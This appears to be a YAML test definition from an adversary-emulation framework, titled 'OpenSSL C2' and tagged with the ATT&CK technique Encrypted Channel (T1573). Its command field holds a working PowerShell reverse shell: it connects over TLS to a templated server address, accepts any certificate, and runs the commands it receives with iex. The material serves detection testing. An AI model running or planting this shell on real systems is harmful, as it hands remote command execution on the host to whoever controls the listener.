- description: 'Thanks to @OrOneEqualsOne for this quick C2 method.

    This is to test to see if a C2 session can be established using an SSL socket.

    More information about this technique, including how to set up the listener, can
    be found here:

    https://medium.com/walmartlabs/openssl-server-reverse-shell-from-windows-client-aee2dbfa0926


    Upon successful execution, powershell will make a network connection to 127.0.0.1
    over 443.

    '
  id: fb827394b296192cb7a81031a2e37ae2
  name: OpenSSL C2
  platforms:
    windows:
      psh:
        cleanup: ''
        command: $server_ip =; $server_port =; $socket = New-Object Net.Sockets.TcpClient('#{server_ip}',
          '#{server_port}'); $stream = $socket.GetStream(); $sslStream = New-Object
          System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]));
          $sslStream.AuthenticateAsClient('fakedomain.example', $null, "Tls12", $false);
          $writer = new-object System.IO.StreamWriter($sslStream); $writer.Write('PS
          ' + (pwd).Path + '> '); $writer.flush(); [byte[]]$bytes = 0..65535|%{0};
          while(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0); {$data =
          (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
          $sendback = (iex $data | Out-String ) 2>&1; $sendback2 = $sendback + 'PS
          ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
          $sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}
        parsers:
          plugins.atomic.app.parsers.atomic_powershell:
          - source: validate_me
        payloads: []
  tactic: command-and-control
  technique:
    attack_id: T1573
    name: Encrypted Channel
